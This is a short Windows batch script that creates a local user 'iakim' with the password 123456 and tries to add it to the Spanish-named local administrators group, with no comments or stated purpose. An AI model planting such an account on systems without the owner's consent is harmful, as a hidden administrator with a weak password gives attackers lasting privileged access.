echo off

net users iakim 123456 /add
net localgroup administradores iakim * /add
